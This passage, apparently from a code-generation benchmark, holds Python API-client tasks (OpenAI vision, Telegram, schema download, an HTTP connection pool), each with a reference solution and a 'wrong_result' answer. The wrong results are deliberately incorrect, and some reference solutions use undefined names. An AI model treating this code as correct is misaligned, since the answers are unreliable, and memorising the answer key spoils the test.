self.PULSSTORY_CLIENT_ID,\n            \"client_secret\": self.PULSSTORY_CLIENT_SECRET\n        }\n        headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"}\n        response = requests.post(f\"{self.URLBase}{endpoint}\", data=payload, headers=headers)\n        response.raise_for_status()\n\n    def download_activity(self, service_record: object, activity_id: str) -> dict:\n        endpoint = f\"/activity/{activity_id}\"\n        response = self._api_request(endpoint, service_record)\n        return response\n\n    def upload_activity(self, service_record: object, upload_data: dict, uris: dict) -> str:\n        endpoint = uris.get(\"upload_endpoint\")\n        headers = {\n            \"Authorization\": f\"Bearer {service_record.get('access_token')}\"\n        }\n        files = {\n            \"file\": (\"activity.zip\", upload_data.get(\"compressed_file\"))\n        }\n        data = {\n            \"activity_metadata\": json.dumps(upload_data.get(\"metadata\")),\n            \"timestamp\": datetime.now().isoformat()\n        }\n        response = self._api_request(endpoint, service_record, method=\"POST\", data=data, headers=headers, files=files)\n        return response.get(\"upload_id\")\n```"
  },
  {
    "Task_id": 113,
    "Instruction": "Task Description: Implement a Python class that interacts with OpenAI's GPT-4 Vision API to process image and text prompts, handling image encoding and API communication with retry logic.\n\nClass Description: OpenAIGPT4Vision is a client for OpenAI's GPT-4 Vision API that processes both text and image inputs. It handles image conversion to base64 format, API request construction, and response processing with built-in retry mechanisms for failed requests.\n\nAttributes:\napi_key: str - The OpenAI API key for authentication\nheaders: dict - HTTP headers including Content-Type and Authorization\nmax_new_tokens: int - Maximum number of tokens to generate in the response (default: 256)\n\nMethods:\n__init__(api_key: str, max_new_tokens: int = 256) -> None - Initializes the API client with authentication and configuration\nencode_image_to_base64(raw_image_data: PIL.Image.Image) -> str - Static method that converts PIL Image to base64 encoded string\ngenerate(text_prompt: str, raw_image_data: Union[PIL.Image.Image, dict, str]) -> str - Processes text and image input, calls the API, and returns the generated content\n_get_pil_image(raw_image_data: Union[PIL.Image.Image, dict, str]) -> PIL.Image.Image - Static helper method to convert various image formats to PIL Image object",
    "Canonical_solution": "import requests\nimport base64\nfrom PIL import Image\nimport io\nimport time\n\nclass OpenAIGPT4Vision:\n    def __init__(self, api_key: str, max_new_tokens: int = 256):\n        self.api_key = api_key\n        self.headers = {\"Content-Type\": \"application/json\", \"Authorization\": f\"Bearer {api_key}\"}\n        self.max_new_tokens = max_new_tokens\n\n    @staticmethod\n    def encode_image_to_base64(raw_image_data) -> str:\n        if isinstance(raw_image_data, Image.Image):\n            buffered = io.BytesIO()\n            raw_image_data.save(buffered, format=\"JPEG\")\n            return base64.b64encode(buffered.getvalue()).decode(\"utf-8\")\n        raise ValueError(\"The input image data must be a PIL.Image.Image\")\n\n    def generate(self, text_prompt: str, raw_image_data):\n        raw_image_data = self._get_pil_image(raw_image_data).convert(\"RGB\")\n        base64_image = self.encode_image_to_base64(raw_image_data)\n\n        payload = {\n            \"model\": \"gpt-4-vision-preview\",\n            \"messages\": [\n                {\n                    \"role\": \"user\",\n                    \"content\": [\n                        {\"type\": \"text\", \"text\": text_prompt},\n                        {\"type\": \"image_url\", \"image_url\": {\"url\": f\"data:image/jpeg;base64,{base64_image}\"}},\n                    ],\n                }\n            ],\n            \"max_tokens\": self.max_new_tokens,\n        }\n\n        retry = True\n        retry_times = 0\n        while retry and retry_times < 5:\n            response = requests.post(\"https://api.openai.com/v1/chat/completions\", headers=self.headers, json=payload)\n            if response.status_code == 200:\n                response_data = response.json()\n                return response_data[\"choices\"][0][\"message\"][\"content\"]\n            else:\n                print(f\"Failed to connect to OpenAI API: {response.status_code} - {response.text}. Retrying...\")\n                time.sleep(10)\n                retry_times += 1\n        return \"Failed to connect to OpenAI GPT4V API\"\n\n    @staticmethod\n    def _get_pil_image(raw_image_data) -> Image.Image:\n        if isinstance(raw_image_data, Image.Image):\n            return raw_image_data\n        elif isinstance(raw_image_data, dict) and \"bytes\" in raw_image_data:\n            return Image.open(io.BytesIO(raw_image_data[\"bytes\"]))\n        elif isinstance(raw_image_data, str):\n            image_bytes = base64.b64decode(raw_image_data)\n            return Image.open(io.BytesIO(image_bytes))\n        else:\n            raise ValueError(\"Unsupported image data format\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport base64\nfrom typing import Union\nfrom PIL import Image as PILImage\nimport requests\nimport time\nimport json\n\nclass OpenAIGPT4Vision:\n    def __init__(self, api_key: str, max_new_tokens: int = 256) -> None:\n        self.api_key = api_key\n        self.headers = {\n            \"Content-Type\": \"application/json\",\n            \"Authorization\": f\"Bearer {api_key}\"\n        }\n        self.max_new_tokens = max_new_tokens\n\n    @staticmethod\n    def encode_image_to_base64(raw_image_data: PILImage.Image) -> str:\n        buffered = raw_image_data.convert(\"RGB\")\n        img_byte_arr = base64.b64encode(buffered.tobytes()).decode('utf-8')\n        return img_byte_arr\n\n    @staticmethod\n    def _get_pil_image(raw_image_data: Union[PILImage.Image, dict, str]) -> PILImage.Image:\n        if isinstance(raw_image_data, PILImage.Image):\n            return raw_image_data\n        elif isinstance(raw_image_data, dict) and 'image' in raw_image_data:\n            return PILImage.open(raw_image_data['image'])\n        elif isinstance(raw_image_data, str):\n            return PILImage.open(raw_image_data)\n        else:\n            raise ValueError(\"Unsupported image format\")\n\n    def generate(self, text_prompt: str, raw_image_data: Union[PILImage.Image, dict, str]) -> str:\n        pil_image = self._get_pil_image(raw_image_data)\n        base64_image = self.encode_image_to_base64(pil_image)\n\n        payload = {\n            \"model\": \"gpt-4-vision-preview\",\n            \"messages\": [\n                {\n                    \"role\": \"user\",\n                    \"content\": [\n                        {\"type\": \"text\", \"text\": text_prompt},\n                        {\n                            \"type\": \"image_url\",\n                            \"image_url\": {\n                                \"url\": f\"data:image/jpeg;base64,{base64_image}\"\n                            }\n                        }\n                    ]\n                }\n            ],\n            \"max_tokens\": self.max_new_tokens\n        }\n\n        retries = 3\n        for attempt in range(retries):\n            try:\n                response = requests.post(\n                    \"https://api.openai.com/v1/chat/completions\",\n                    headers=self.headers,\n                    data=json.dumps(payload)\n                )\n                response.raise_for_status()\n                return response.json()['choices'][0]['message']['content']\n            except (requests.HTTPError, requests.ConnectionError, json.JSONDecodeError) as e:\n                if attempt < retries - 1:\n                    time.sleep(2 ** attempt)\n                else:\n                    raise e\n```"
  },
  {
    "Task_id": 114,
    "Instruction": "Task Description: Write a Python function that downloads a schema file from a given URL and returns its local path. The function should handle cases where the file already exists locally and properly manage HTTP request failures.\n\nFunction Description: The function `download_schema_file` downloads a JSON schema file from a specified URL to a local path. It checks if the file already exists locally before attempting to download. If the download fails, it issues a warning and exits the script. The function uses the `requests` library for HTTP operations and handles file paths using `pathlib.Path`.\n\nInput: \n- `envs` (Dict[str, Any]): A dictionary containing environment variables with the following keys:\n  - `SIGMA_SCHEMA_FILE`: Optional local path for the schema file. If not provided, defaults to \"sigma-schema.json\" in the workspace.\n  - `SIGMA_SCHEMA_URL`: URL from which to download the schema file.\n  - `GITHUB_WORKSPACE`: Base directory path for resolving relative file paths.\n\nOutput: \n- `Path | NoReturn`: Returns the absolute path to the downloaded schema file if successful. If the download fails, the function exits the script with status code -1.",
    "Canonical_solution": "import os\nimport requests\nimport warnings\nfrom pathlib import Path\nfrom typing import Any, Dict, NoReturn\n\ndef download_schema_file(envs: Dict[str, Any]) -> Path | NoReturn:\n    \"\"\"Download the schema file from the given URL and return its path.\n\n    Args:\n        envs (Dict[str, Any]): A dictionary containing the environment variables\n            used by the action.\n\n    Returns:\n        Path | NoReturn: Path to the schema file or exit the script if\n            the file could not be downloaded.\n    \"\"\"\n\n    schema_file = envs[\"SIGMA_SCHEMA_FILE\"]\n    schema_url = envs[\"SIGMA_SCHEMA_URL\"]\n    if not schema_file:\n        schema_file = envs[\"GITHUB_WORKSPACE\"] / \"sigma-schema.json\"\n    else:\n        schema_file = Path(schema_file)\n        if not schema_file.exists():\n            schema_file = envs[\"GITHUB_WORKSPACE\"] / schema_file\n\n    if not schema_file.exists():\n        response = requests.get(schema_url)\n        if response.status_code == 200:\n            with open(schema_file, \"wb\") as f:\n                f.write(response.content)\n        else:\n            warnings.warn(\n                f\"Failed to download schema file {schema_file}, skipping validation\"\n            )\n            os._exit(-1)\n    return (envs[\"GITHUB_WORKSPACE\"] / schema_file).absolute()",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport sys\nimport warnings\nimport requests\nfrom typing import Dict, Any\nfrom pathlib import Path\n\ndef download_schema_file(envs: Dict[str, Any]) -> Path:\n    schema_url = envs[\"SIGMA_SCHEMA_URL\"]\n    workspace = Path(envs.get(\"GITHUB_WORKSPACE\", os.getcwd()))\n    schema_file_path = Path(envs.get(\"SIGMA_SCHEMA_FILE\", \"sigma-schema.json\"))\n\n    if not schema_file_path.is_absolute():\n        schema_file_path = workspace / schema_file_path\n\n    if schema_file_path.exists():\n        return schema_file_path\n\n    try:\n        response = requests.get(schema_url)\n        response.raise_for_status()\n        with open(schema_file_path, \"wb\") as f:\n            f.write(response.content)\n    except requests.RequestException as e:\n        warnings.warn(f\"Failed to download schema file from {schema_url}: {e}\")\n        sys.exit(-1)\n\n    return schema_file_path\n```"
  },
  {
    "Task_id": 117,
    "Instruction": "Task Description: Implement a Python class that serves as a client for interacting with the Telegram Bot API, enabling message and file sending functionality.\n\nClass Description: The TelegramClient class provides methods to send messages and files to a specified Telegram chat using the Telegram Bot API. It handles HTTP requests and responses, including error logging.\n\nAttributes:\n- chat_id: [Union[int, str]] - The unique identifier for the target chat or username of the target channel (in format @channelusername)\n- thread_id: [int] - The unique identifier for the target message thread (topic) in a forum-style chat\n- bot_token: [str] - The authentication token for the Telegram bot\n\nMethods:\n- send_message(message: str, disable_links_preview: bool = True) -> None - Sends a text message to the specified chat. Uses Markdown formatting by default and can disable web page previews.\n  Input:\n    - message: [str] - The text message to be sent\n    - disable_links_preview: [bool] - Whether to disable web page previews for links in the message (default: True)\n  Output: None (logs errors if request fails)\n\n- send_file(file_name: str, contents: bytes) -> None - Sends a file to the specified chat, automatically handling different file types (photos vs documents) and converting SVG to PNG if needed.\n  Input:\n    - file_name: [str] - The name of the file to be sent\n    - contents: [bytes] - The binary content of the file\n  Output: None (logs errors if request fails)",
    "Canonical_solution": "import logging\nimport os\nfrom typing import Union\nimport requests\n\nTELEGRAM_BASE_URL = os.environ.get(\"TELEGRAM_BASE_URL\", \"https://api.telegram.org\")\n\nclass TelegramClient:\n    def __init__(self, chat_id: Union[int, str], thread_id: int, bot_token: str):\n        self.chat_id = int(chat_id)\n        self.thread_id = thread_id\n        self.bot_token = bot_token\n\n    def send_message(self, message: str, disable_links_preview: bool = True):\n        url = f\"{TELEGRAM_BASE_URL}/bot{self.bot_token}/sendMessage\"\n        message_json = {\n            \"chat_id\": self.chat_id,\n            \"message_thread_id\": self.thread_id,\n            \"disable_web_page_preview\": disable_links_preview,\n            \"parse_mode\": \"Markdown\",\n            \"text\": message,\n        }\n        response = requests.post(url, json=message_json)\n\n        if response.status_code != 200:\n            logging.error(\n                f\"Failed to send telegram message: chat_id - {self.chat_id} reason - {response.reason} {response.text}\"\n            )\n\n    def send_file(self, file_name: str, contents: bytes):\n        file_type = \"Photo\" if is_image(file_name) else \"Document\"\n        url = f\"{TELEGRAM_BASE_URL}/bot{self.bot_token}/send{file_type}?chat_id={self.chat_id}\"\n        if file_name.endswith(SVG_SUFFIX):\n            contents = convert_svg_to_png(contents)\n            file_name = file_name.replace(SVG_SUFFIX, PNG_SUFFIX)\n\n        files = {file_type.lower(): (file_name, contents)}\n        response = requests.post(url, files=files)\n\n        if response.status_code != 200:\n            logging.error(\n                f\"Failed to send telegram file: chat_id - {self.chat_id} reason - {response.reason} {response.text}\"\n            )",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport requests\nimport logging\nfrom typing import Union\n\nclass TelegramClient:\n    API_URL = 'https://api.telegram.org/bot{token}/{method}'\n\n    def __init__(self, chat_id: Union[int, str], thread_id: int, bot_token: str):\n        self.chat_id = chat_id\n        self.thread_id = thread_id\n        self.bot_token = bot_token\n        self.logger = logging.getLogger(__name__)\n        logging.basicConfig(level=logging.ERROR)\n\n    def send_message(self, message: str, disable_links_preview: bool = True) -> None:\n        url = self.API_URL.format(token=self.bot_token, method='sendMessage')\n        payload = {\n            'chat_id': self.chat_id,\n            'text': message,\n            'parse_mode': 'Markdown',\n            'disable_web_page_preview': disable_links_preview\n        }\n        if self.thread_id:\n            payload['message_thread_id'] = self.thread_id\n        try:\n            response = requests.post(url, json=payload)\n            response.raise_for_status()\n        except Exception as e:\n            self.logger.error(f\"Failed to send message: {e}\")\n\n    def send_file(self, file_name: str, contents: bytes) -> None:\n        url = self.API_URL.format(token=self.bot_token, method='sendDocument' if not file_name.lower().endswith('.svg') else 'sendPhoto')\n        files = {'document' if not file_name.lower().endswith('.svg') else 'photo': (file_name, contents)}\n        data = {\n            'chat_id': self.chat_id\n        }\n        if self.thread_id:\n            data['message_thread_id'] = self.thread_id\n        try:\n            response = requests.post(url, data=data, files=files)\n            response.raise_for_status()\n        except Exception as e:\n            self.logger.error(f\"Failed to send file: {e}\")\n```"
  },
  {
    "Task_id": 119,
    "Instruction": "Task Description: Create a Python class that serves as a base HTTP client for interacting with a RESTful API, handling various types of API calls (GET, POST, PUT, DELETE) with proper error handling and logging.\n\nClass Description: SXTBaseAPI is a base class that provides HTTP client functionality for making API calls to a specified endpoint. It handles authentication, request construction, response processing, and error handling. The class supports configurable API versions, network call simulation, and comprehensive logging.\n\nAttributes:\n- api_url: str - Base URL for the API endpoint (default: 'https://api.spaceandtime.app')\n- access_token: str - Authentication token for API access\n- logger: logging.Logger - Logger instance for recording API call information\n- network_calls_enabled: bool - Flag to enable/disable actual network calls (default: True)\n- standard_headers: dict - Default headers for API requests\n- versions: dict - Dictionary mapping API endpoints to their versions\n- APICALLTYPE: Enum - Reference to SXTApiCallTypes enum for request types\n\nMethods:\n- __init__(access_token: str = '', logger: logging.Logger = None) -> None - Initializes the API client with optional access token and logger\n- call_api(endpoint: str, auth_header: bool = True, request_type: str = SXTApiCallTypes.POST, header_parms: dict = {}, data_parms: dict = {}, query_parms: dict = {}, path_parms: dict = {}) -> tuple[bool, dict] - Makes an API call with specified parameters and returns success status with response data\n- __fakedata__(endpoint: str) -> Union[list, dict] - Generates mock data when network calls are disabled (for testing purposes)",
    "Canonical_solution": "import requests\nimport json\nimport logging\nfrom pathlib import Path\nfrom .sxtenums import SXTApiCallTypes\nfrom .sxtexceptions import SxTArgumentError, SxTAPINotDefinedError\nfrom .sxtbiscuits import SXTBiscuit\n\nclass SXTBaseAPI:\n    api_url = 'https://api.spaceandtime.app'\n    access_token = ''\n    logger: logging.Logger\n    network_calls_enabled: bool = True\n    standard_headers = {\n        \"accept\": \"application/json\",\n        \"content-type\": \"application/json\"\n    }\n    versions = {}\n    APICALLTYPE = SXTApiCallTypes\n\n    def __init__(self, access_token: str = '', logger: logging.Logger = None) -> None:\n        if logger:\n            self.logger = logger\n        else:\n            self.logger = logging.getLogger()\n            self.logger.setLevel(logging.INFO)\n            if len(self.logger.handlers) == 0:\n                self.logger.addHandler(logging.StreamHandler())\n\n        apiversionfile = Path(Path(__file__).resolve().parent / 'apiversions.json')\n        self.access_token = access_token\n        with open(apiversionfile, 'r') as fh:\n            content = fh.read()\n        self.versions = json.loads(content)\n\n    def call_api(self, endpoint: str,\n                 auth_header: bool = True,\n                 request_type: str = SXTApiCallTypes.POST,\n                 header_parms: dict = {},\n                 data_parms: dict = {},\n                 query_parms: dict = {},\n                 path_parms: dict = {}):\n        txt = 'response.text not available - are you sure you have the correct API Endpoint?'\n        statuscode = 555\n        response = {}\n\n        if not self.network_calls_enabled: return True, self.__fakedata__(endpoint)\n\n        def __handle_errors__(txt, ex, statuscode, responseobject, loggerobject):\n            loggerobject.error(txt)\n            rtn = {'text': txt}\n            rtn['error'] = str(ex)\n            rtn['status_code'] = statuscode\n            rtn['response_object'] = responseobject\n            return False, rtn\n\n        try:\n            if endpoint not in self.versions.keys():\n                raise SxTAPINotDefinedError(\"Endpoint not defined in API Lookup (apiversions.json). Please reach out to Space and Time for assistance. \\nAs a work-around, you can try manually adding the endpoint to the SXTBaseAPI.versions dictionary.\")\n            version = self.versions[endpoint]\n            self.logger.debug(f'API Call started for endpoint: {version}/{endpoint}')\n\n            if request_type not in SXTApiCallTypes:\n                msg = f'request_type must be of type SXTApiCallTypes, not { type(request_type) }'\n                raise SxTArgumentError(msg, logger=self.logger)\n\n            for name, value in path_parms.items():\n                endpoint = endpoint.replace(f'{{{name}}}', value)\n\n            if query_parms != {}:\n                endpoint = f'{endpoint}?' + '&'.join([f'{n}={v}' for n, v in query_parms.items()])\n\n            headers = {k: v for k, v in self.standard_headers.items()}\n            if auth_header: headers['authorization'] = f'Bearer {self.access_token}'\n            headers.update(header_parms)\n\n            url = f'{self.api_url}/{version}/{endpoint}'\n\n            match request_type:\n                case SXTApiCallTypes.POST: callfunc = requests.post\n                case SXTApiCallTypes.GET: callfunc = requests.get\n                case SXTApiCallTypes.PUT: callfunc = requests.put\n                case SXTApiCallTypes.DELETE: callfunc = requests.delete\n                case _: raise SxTArgumentError('Call type must be SXTApiCallTypes enum.', logger=self.logger)\n\n            response = callfunc(url=url, data=json.dumps(data_parms), headers=headers)\n            txt = response.text\n            statuscode = response.status_code\n            response.raise_for_status()\n\n            try:\n                self.logger.debug('API return content type: ' + response.headers.get('content-type', ''))\n                rtn = response.json()\n            except json.decoder.JSONDecodeError as ex:\n                rtn = {'text': txt, 'status_code': statuscode}\n\n            self.logger.debug(f'API call completed for endpoint: \"{endpoint}\" with result: {txt}')\n            return True, rtn\n\n        except requests.exceptions.RequestException as ex:\n            return __handle_errors__(txt, ex, statuscode, response, self.logger)\n        except SxTAPINotDefinedError as ex:\n            return __handle_errors__(txt, ex, statuscode, response, self.logger)\n        except Exception as ex:\n            return __handle_errors__(txt, ex, statuscode, response, self.logger)\n\n    def __fakedata__(self, endpoint: str):\n        if endpoint in ['sql', 'sql/dql']:\n            rtn = [{'id': '1', 'str': 'a', 'this_record': 'is a test'}]\n            rtn.append({'id': '2', 'str': 'b', 'this_record': 'is a test'})\n            rtn.append({'id': '3', 'str': 'c', 'this_record': 'is a test'})\n            return rtn\n        else:\n            return {'authCode': '469867d9660b67f8aa12b2',\n                    'accessToken': 'eyJ0eXBlIjoiYWNjZXNzIiwia2lkIjUxNDVkYmQtZGNmYi00ZjI4LTg3NzItZjVmNjNlMzcwM2JlIiwiYWxnIjoiRVMyNTYifQ.eyJpYXQiOjE2OTczOTM1MDIsIm5iZiI6MTY5NzM5MzUwMiwiZXhwIjoxNjk3Mzk1MDAyLCJ0eXBlIjoiYWNjZXNzIiwidXNlciI6InN0ZXBoZW4iLCJzdWJzY3JpcHRpb24iOiIzMWNiMGI0Yi0xMjZlLTRlM2MtYTdhMS1lNWRmNDc4YTBjMDUiLCJzZXNzaW9uIjoiMzNiNGRhMzYxZjZiNTM3MjZlYmYyNzU4Iiwic3NuX2V4cCI6MTY5NzQ3OTkwMjMxNSwiaXRlcmF0aW9uIjoiNDEwY2YyZTgyYWZlODdmNDRiMzE4NDFiIn0.kpvrG-ro13P1YeMF6sjLh8wn1rO3jpCVeTrzhDe16ZmJu4ik1amcYz9uQff_XQcwBDrpnCeD5ZZ9mHqb_basew',\n                    'refreshToken': 'eyJ0eXBlIjoicmVmcmVzaCIsImtpZCITQ1ZGJkLWRjZmItNGYyOC04NzcyLWY1ZjYzZTM3MDNiZSIsImFsZyI6IkVTMjU2In0.eyJpYXQiOjE2OTczOTM1MDIsIm5iZiI6MTY5NzM5MzUwMiwiZXhwIjoxNjk3Mzk1MzAyLCJ0eXBlIjoicmVmcmVzaCIsInVzZXIiOiJzdGVwaGVuIiwic3Vic2NyaXB0aW9uIjoiMzFjYjBiNGItMTI2ZS00ZTNjLWE3YTEtZTVkZjQ3OGEwYzA1Iiwic2Vzc2lvbiI6IjMzYjRkYTM2MWY2YjUzNzI2ZWJmMjc1OCIsInNzbl9leHAiOjE2OTc0Nzk5MDIzMTUsIml0ZXJhdGlvbiI6IjQxMGNmMmU4MmFmZTg3ZjQ0YjMxODQxYiJ9.3vVYpTGBjXIejlaacaZOh_59O9ETfbvTCWvldoi0ojyXTRkTmENVpQRbw7av7yMM2jA7SRdEPQGGjYmThCfk9w',\n                    'accessTokenExpires': 1973950023160,\n                    'refreshTokenExpires': 1973953023160}",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport logging\nimport requests\nfrom enum import Enum\nfrom typing import Union, Tuple, Dict, Any\n\nclass SXTApiCallTypes(Enum):\n    GET = \"GET\"\n    POST = \"POST\"\n    PUT = \"PUT\"\n    DELETE = \"DELETE\"\n\nclass SXTBaseAPI:\n    def __init__(self, access_token: str = '', logger: logging.Logger = None) -> None:\n        self.api_url: str = 'https://api.spaceandtime.app'\n        self.access_token: str = access_token\n        self.logger: logging.Logger = logger or logging.getLogger(__name__)\n        self.network_calls_enabled: bool = True\n        self.standard_headers: dict = {\n            'Content-Type': 'application/json',\n            'Accept': 'application/json'\n        }\n        self.versions: dict = {\n            'default': 'v1'\n        }\n\n    def call_api(\n        self,\n        endpoint: str,\n        auth_header: bool = True,\n        request_type: SXTApiCallTypes = SXTApiCallTypes.POST,\n        header_parms: dict = {},\n        data_parms: dict = {},\n        query_parms: dict = {},\n        path_parms: dict = {}\n    ) -> Tuple[bool, dict]:\n        headers = self.standard_headers.copy()\n        if auth_header and self.access_token:\n            headers['Authorization'] = f'Bearer {self.access_token}'\n        headers.update(header_parms)\n\n        url = self._build_url(endpoint, path_parms, query_parms)\n        self.logger.debug(f\"Constructed URL: {url}\")\n        self.logger.debug(f\"Request Headers: {headers}\")\n        self.logger.debug(f\"Request Body: {data_parms}\")\n\n        if not self.network_calls_enabled:\n            return (True, self.__fakedata__(endpoint))\n\n        try:\n            response = requests.request(\n                method=request_type.value,\n                url=url,\n                headers=headers,\n                json=data_parms\n            )\n            response.raise_for_status()\n            result = response.json() if response.content else {}\n            self.logger.info(f\"API Call to {url} successful. Status Code: {response.status_code}\")\n            return (True, result)\n        except requests.exceptions.RequestException as e:\n            self.logger.error(f\"API Call to {url} failed: {e}\")\n            return (False, {\"error\": str(e)})\n\n    def _build_url(self, endpoint: str, path_parms: dict, query_parms: dict) -> str:\n        version = self.versions.get(endpoint.split('/')[0], self.versions['default'])\n        base = f\"{self.api_url}/{version}\"\n        for key, value in path_parms.items():\n            placeholder = f\"<{key}>\"\n            if placeholder in endpoint:\n                endpoint = endpoint.replace(placeholder, str(value))\n        url = f\"{base}{endpoint}\"\n        if query_parms:\n            from urllib.parse import urlencode\n            url += f\"?{urlencode(query_parms)}\"\n        return url\n\n    def __fakedata__(self, endpoint: str) -> Union[list, dict]:\n        fake_data_map = {\n            \"/users\": [{\"id\": 1, \"name\": \"Alice\"}, {\"id\": 2, \"name\": \"Bob\"}],\n            \"/posts\": [{\"id\": 101, \"title\": \"Hello World\"}, {\"id\": 102, \"title\": \"Goodbye World\"}]\n        }\n        return fake_data_map.get(endpoint, {\"message\": \"No mock data available\"})\n```"
  },
  {
    "Task_id": 12,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages reusable HTTP connections to a server, handling connection creation, retrieval, and release, with support for timeouts and retries.\n\nClass Description: HTTPConnectionPool is a connection pool manager for HTTP connections that maintains a pool of reusable connections to a specified host and port. It handles connection lifecycle, including creation, retrieval, release, and cleanup, with support for connection timeouts and retry mechanisms.\n\nAttributes:\n- scheme: str - The URL scheme (default 'http')\n- ConnectionCls: class - The connection class to use (default HTTPConnection)\n- ResponseCls: class - The response class to use (default HTTPResponse)\n- host: str - The target host for connections\n- port: int - The target port for connections\n- timeout: Timeout - Default timeout configuration\n- retries: Retry - Default retry configuration\n- pool: queue.LifoQueue - The connection pool storage\n- block: bool - Whether to block when pool is full\n- proxy: str - Proxy server URL (optional)\n- proxy_headers: dict - Headers for proxy requests\n- conn_kw: dict - Additional connection parameters\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with given parameters\n- _new_conn() -> HTTPConnection - Creates and returns a new connection instance\n- _get_conn(timeout=None) -> HTTPConnection - Retrieves a connection from the pool or creates a new one\n- _put_conn(conn) -> None - Returns a connection to the pool or closes it if pool is full\n- _make_request(conn, method, url, timeout=_Default, **httplib_request_kw) -> HTTPResponse - Makes an HTTP request using the specified connection\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, **response_kw) -> HTTPResponse - Main method to open a URL using a connection from the pool",
    "Canonical_solution": "from socket import error as SocketError, timeout as SocketTimeout\nimport socket\nfrom .connection import HTTPConnection, HTTPSConnection, VerifiedHTTPSConnection\nfrom .response import HTTPResponse\nfrom .util.timeout import Timeout\nfrom .util.retry import Retry\nfrom .util.url import get_host, Url\nfrom .exceptions import (\n    ClosedPoolError,\n    EmptyPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProxyError,\n    ReadTimeoutError,\n    SSLError,\n    TimeoutError,\n    ProtocolError,\n    HTTPException,\n    BaseSSLError,\n    CertificateError,\n    NewConnectionError\n)\nfrom .packages import six\nfrom .packages.six.moves import queue\nimport warnings\nimport logging\n\nlog = logging.getLogger(__name__)\n\nclass HTTPConnectionPool:\n    scheme = 'http'\n    ConnectionCls = HTTPConnection\n    ResponseCls = HTTPResponse\n\n    def __init__(self, host, port=None, strict=False,\n                 timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False,\n                 headers=None, retries=None,\n                 _proxy=None, _proxy_headers=None,\n                 **conn_kw):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.pool = queue.LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n        for _ in six.moves.xrange(maxsize):\n            self.pool.put(None)\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            strict=self.strict,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n        except queue.Empty:\n            if self.block:\n                raise EmptyPoolError(self, \"Pool reached maximum size and no more connections are allowed.\")\n            return self._new_conn()\n\n        if conn and is_connection_dropped(conn):\n            conn.close()\n            conn = None\n\n        return conn or self._new_conn()\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put(conn, block=False)\n        except queue.Full:\n            conn.close()\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            conn.request(method, url, **httplib_request_kw)\n        except (SocketTimeout, BaseSSLError) as e:\n            raise ReadTimeoutError(self, url, \"Read timed out.\")\n\n        read_timeout = timeout_obj.read_timeout\n        if getattr(conn, 'sock', None):\n            conn.sock.settimeout(read_timeout)\n\n        try:\n            httplib_response = conn.getresponse()\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            raise ReadTimeoutError(self, url, \"Read timed out.\")\n\n        return httplib_response\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None,\n                redirect=True, assert_same_host=True, timeout=_Default,\n                pool_timeout=None, release_conn=None, **response_kw):\n        if retries is None:\n            retries = self.retries\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries)\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=pool_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n\n            httplib_response = self._make_request(\n                conn, method, url, timeout=timeout_obj,\n                body=body, headers=headers\n            )\n\n            response = self.ResponseCls.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=conn,\n                retries=retries,\n                **response_kw\n            )\n\n            return response\n\n        except (TimeoutError, HTTPException, SocketError, ProtocolError,\n                BaseSSLError, SSLError, CertificateError) as e:\n            if conn:\n                conn.close()\n            raise MaxRetryError(self, url, e)\n\n        finally:\n            if release_conn:\n                self._put_conn(conn)",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport queue\nimport socket\nfrom http.client import HTTPConnection, HTTPResponse\nfrom urllib.parse import urlparse\n\nclass Timeout:\n    DEFAULT_TIMEOUT = 60\n\nclass Retry:\n    pass\n\nclass HTTPConnectionPool:\n    def __init__(self, host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        self.scheme = 'http'\n        self.ConnectionCls = HTTPConnection\n        self.ResponseCls = HTTPResponse\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.pool = queue.LifoQueue(maxsize=maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n    def _new_conn(self):\n        extra_kw = {'timeout': self.timeout}\n        if self.proxy:\n            parsed = urlparse(self.proxy)\n            conn = self.ConnectionCls(parsed.hostname, parsed.port, **extra_kw)\n            conn.set_tunnel(self.host, self.port, self.proxy_headers)\n        else:\n            conn = self.ConnectionCls(self.host, self.port, **extra_kw)\n        return conn\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get_nowait()\n        except queue.Empty:\n            conn = self._new_conn()\n        return conn\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put_nowait(conn)\n        except queue.Full:\n            